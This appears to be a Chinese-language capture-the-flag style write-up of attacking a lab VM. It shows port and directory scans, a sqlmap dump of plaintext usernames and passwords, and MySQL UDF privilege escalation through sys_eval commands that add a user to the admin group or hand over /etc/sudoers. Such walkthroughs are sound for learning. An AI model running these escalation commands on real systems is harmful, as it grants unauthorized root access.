```

```

## 信息收集

### 端口扫描

```
nmap -sT -sV -O -p$ports 192.168.137.139             
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-25 17:44 CST
Nmap scan report for 192.168.137.139
Host is up (0.00042s latency).

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
MAC Address: 00:0C:29:7D:DB:27 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.08 seconds
```

### whatweb

```
Summary   : Apache[2.2.8], HTTPServer[Ubuntu Linux][Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch], PasswordField[mypassword], PHP[5.2.4-2ubuntu5.6][Suhosin-Patch], X-Powered-By[PHP/5.2.4-2ubuntu5.6]
```

### 3.dirsearch

```
[18:19:16] 200 -   109B - /checklogin
[18:19:16] 200 -   109B - /checklogin.php
[18:19:17] 200 -   298B - /database.sql
[18:19:17] 403 -   326B - /doc/
[18:19:17] 403 -   330B - /doc/api/
[18:19:17] 403 -   341B - /doc/en/changes.html
[18:19:17] 403 -   340B - /doc/stable.version
[18:19:17] 403 -   341B - /doc/html/index.html
[18:19:18] 200 -   934B - /images/
[18:19:18] 301 -   358B - /images  ->  http://192.168.137.139/images/
[18:19:18] 200 -    1KB - /index
[18:19:18] 200 -    1KB - /index.php
[18:19:18] 200 -    1KB - /index.php/login/
```

### 4.sqlmap

```
 id | password              | username |
+----+-----------------------+----------+
| 1  | MyNameIsJohn          | john     |
| 2  | ADGAdsafdfwt4gadfga== | robert 
```

### udf提权

```
whereis lib_mysqludf_sys.so

/usr/lib/lib_mysqludf_sys.so
```

```
create function sys_eval returns strings soname ‘lib_mysqludf_sys.so’;
```

```
将john用户添加到管理员组
select sys_eval('usermod -a -G admin john');
```

或者

```
select sys_eval('chown -R john:john /etc/sudoers');

然后再sudoers中添加john用户的权限
```

